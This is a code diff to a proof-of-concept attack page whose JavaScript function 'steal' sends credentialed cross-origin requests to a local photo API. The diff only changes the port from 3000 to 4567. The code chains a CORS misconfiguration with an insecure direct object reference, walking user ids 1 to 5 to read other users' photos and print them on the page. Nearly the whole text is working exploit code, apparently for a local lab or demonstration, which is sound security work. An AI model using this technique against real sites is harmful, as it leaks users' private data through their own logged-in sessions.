@@ -19,13 +19,13 @@ async function steal() {
   const out = document.getElementById('out');
   out.textContent = 'Fetching...';
 
-  const whoami = await fetch('http://127.0.0.1:3000/api/whoami', { credentials: 'include' }).then(r => r.json());
-  const myPhotos = await fetch(`http://127.0.0.1:3000/api/users/${whoami.user ? whoami.user.id : 1}/photos`, { credentials: 'include' }).then(r => r.json());
+  const whoami = await fetch('http://127.0.0.1:4567/api/whoami', { credentials: 'include' }).then(r => r.json());
+  const myPhotos = await fetch(`http://127.0.0.1:4567/api/users/${whoami.user ? whoami.user.id : 1}/photos`, { credentials: 'include' }).then(r => r.json());
 
   // IDOR chained through the CORS hole: walk user ids 1..5 cross-origin.
   const stolen = {};
   for (let id = 1; id <= 5; id++) {
-    stolen[id] = await fetch(`http://127.0.0.1:3000/api/users/${id}/photos`, { credentials: 'include' }).then(r => r.json());
+    stolen[id] = await fetch(`http://127.0.0.1:4567/api/users/${id}/photos`, { credentials: 'include' }).then(r => r.json());
   }
 
   out.textContent = JSON.stringify({ whoami, myPhotos, stolenAcrossUsers: stolen }, null, 2);
